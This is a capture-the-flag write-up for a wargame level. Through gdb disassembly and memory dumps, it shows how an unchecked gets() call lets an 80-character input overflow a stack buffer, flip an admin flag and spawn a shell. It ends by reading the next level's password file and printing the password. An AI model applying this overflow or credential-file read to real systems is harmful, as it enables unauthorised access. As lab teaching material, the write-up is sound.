# Level 3

For this level we have the source code, and if we check it we can see that we'll get a sell if `admin_enabled` is different from 0. The problem is that this variable is assigned to `0` and is never changed. The only thing we can modify is the `buffer` of length 64, so let's dissasemble the compiled binrar:

	(gdb) disas main
	Dump of assembler code for function main:
	   0x0000000000400718 <+0>:		push   %rbp
	   0x0000000000400719 <+1>:		mov    %rsp,%rbp
	   0x000000000040071c <+4>:		sub    $0x60,%rsp
	   0x0000000000400720 <+8>:		mov    %edi,-0x54(%rbp)
	   0x0000000000400723 <+11>:	mov    %rsi,-0x60(%rbp)
	   0x0000000000400727 <+15>:	movl   $0x0,-0x4(%rbp)
	   0x000000000040072e <+22>:	mov    $0x400800,%edi
	   0x0000000000400733 <+27>:	callq  0x400540 <puts@plt>
	   0x0000000000400738 <+32>:	lea    -0x50(%rbp),%rax
	   0x000000000040073c <+36>:	mov    %rax,%rdi
	   0x000000000040073f <+39>:	callq  0x4005b0 <gets@plt>
	   0x0000000000400744 <+44>:	mov    -0x4(%rbp),%eax
	   0x0000000000400747 <+47>:	test   %eax,%eax
	   0x0000000000400749 <+49>:	je     0x400761 <main+73>
	   0x000000000040074b <+51>:	mov    $0x400828,%edi
	   0x0000000000400750 <+56>:	callq  0x400540 <puts@plt>
	   0x0000000000400755 <+61>:	mov    $0x0,%eax
	   0x000000000040075a <+66>:	callq  0x4006c6 <spawn_shell>
	   0x000000000040075f <+71>:	jmp    0x40076b <main+83>
	   0x0000000000400761 <+73>:	mov    $0x400891,%edi
	   0x0000000000400766 <+78>:	callq  0x400540 <puts@plt>
	   0x000000000040076b <+83>:	leaveq
	   0x000000000040076c <+84>:	retq
	End of assembler dump.

As we can see in `main+15` a zero is stored in `$rbp-0x4`, we'll supose this is the variable `admin_enabled`. Just before this something is stored in `$rbp-0x54` and `$rbp-0x60`, probably is the assignment of `buffer`.

Let's set a breakpoint at `main+47`, after the function gets is called to check were the input data is stored:

	(gdb) b *main+47
	Breakpoint 1 at 0x400747

We run it and enter 64 'A' (Note: A is encoded as 0x41 in ascii):

		(gdb) r
	Starting program: /matrix/level3/level3
	Zero Cool - Bugdoor v4
	Enter Password:
	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

	Breakpoint 1, 0x0000000000400747 in main ()

Let's see what is stored in `$rbp-0x60` and after:

	(gdb) x/32wx $rbp-0x60
	0x7fffffffeaa0:	0xffffebe8	0x00007fff	0xf7ff74c0	0x00000001
	0x7fffffffeab0:	0x41414141	0x41414141	0x41414141	0x41414141
	0x7fffffffeac0:	0x41414141	0x41414141	0x41414141	0x41414141
	0x7fffffffead0:	0x41414141	0x41414141	0x41414141	0x41414141
	0x7fffffffeae0:	0x41414141	0x41414141	0x41414141	0x41414141
	0x7fffffffeaf0:	0xffffeb00	0x00007fff	0x00000000	0x00000000
	0x7fffffffeb00:	0x00000000	0x00000000	0xf7a54b45	0x00007fff
	0x7fffffffeb10:	0x00000000	0x00000000	0xffffebe8	0x00007fff

Here are stored our 'A'! We also can see that the value of `admin_enabled` is still '0' (adresses from `0x7fffffffeafc` to `0x7fffffffeaff`).

To get the input the source code uses `gets()`, this function doesn't check if the length of the introduced data is bigger than were it has to be assigned. We can use this as our exploit by entering enough 'A', 64+16 in ourcase.

Let's re-run the binaries and check what happens:

	(gdb) r
	Starting program: /matrix/level3/level3
	Zero Cool - Bugdoor v4
	Enter Password:
	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

	Breakpoint 1, 0x0000000000400747 in main ()
	(gdb) x/32wx $rbp-0x60
	0x7fffffffeaa0:	0xffffebe8	0x00007fff	0xf7ff74c0	0x00000001
	0x7fffffffeab0:	0x41414141	0x41414141	0x41414141	0x41414141
	0x7fffffffeac0:	0x41414141	0x41414141	0x41414141	0x41414141
	0x7fffffffead0:	0x41414141	0x41414141	0x41414141	0x41414141
	0x7fffffffeae0:	0x41414141	0x41414141	0x41414141	0x41414141
	0x7fffffffeaf0:	0x41414141	0x41414141	0x41414141	0x41414141
	0x7fffffffeb00:	0x00000000	0x00000000	0xf7a54b45	0x00007fff
	0x7fffffffeb10:	0x00000000	0x00000000	0xffffebe8	0x00007fff

The memory address of `admin_enabled` is no longer `0x00000000`, let's continue the execution:

	(gdb) c
	Continuing.
	Zero Cool - Bugdoor v4
	How can this happen? The variable is set to 0 and is never modified in between O.o
	You must be a hacker!
	$ id
	uid=1003(level3) gid=1003(level3) groups=1003(level3)

Running the binary with gdb doesn't give us level4 permissions, we just have to do the same outside gdb:

	level3@gracker:/matrix/level3$ ./level3
	Zero Cool - Bugdoor v4
	Enter Password:
	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
	How can this happen? The variable is set to 0 and is never modified in between O.o
	You must be a hacker!
	$ id
	uid=1004(level4) gid=1003(level3) groups=1003(level3)
	$ cat /home/level4/.pass
	0LRS6_hjGzCf

And we have access to the next level!


Usefull resources for this level:
+ [gets() function documentation](https://www.tutorialspoint.com/c_standard_library/c_function_gets.htm)